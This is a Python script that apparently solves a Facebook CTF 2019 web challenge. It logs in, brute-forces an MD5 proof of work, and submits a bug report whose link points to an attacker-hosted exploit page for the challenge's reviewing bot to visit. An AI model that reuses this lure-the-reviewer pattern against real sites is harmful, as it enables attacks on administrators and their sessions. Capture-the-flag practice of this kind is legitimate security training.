#!/usr/bin/env python



import requests
import hashlib
import random

def login():
	s = requests.Session()
	data = {"username":"", "password":""}
	url = "http://challenges.fbctf.com:8082/login"
	r = s.post(url, data=data)
	url2 = "http://challenges.fbctf.com:8082/report_bugs"
	r = s.get(url2)
	_pow_string = r.content
	a = r.content.find("proof of work for")
	_check = _pow_string[a+18:a+23]

	return s.cookies,_check

def pow(_a):
	while 1:
		a = random.randint(0, 10000000000000)
		_cp = hashlib.md5(str(a)).hexdigest()
		if _cp[:5] == _a:
			return a
			break

def exploit():
	faded_cookies,_check = login()
	_pow = pow(_check)

	faded_url = "http://challenges.fbctf.com:8082/report_bugs"
	faded_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
	faded_data={"title": "f", "body": "f", "link": "http://vps/fbctf2019/exploit1337.html", "pow_sol": str(_pow)}
	r = requests.post(faded_url, headers=faded_headers, cookies=faded_cookies, data=faded_data)
	print r.content

exploit()

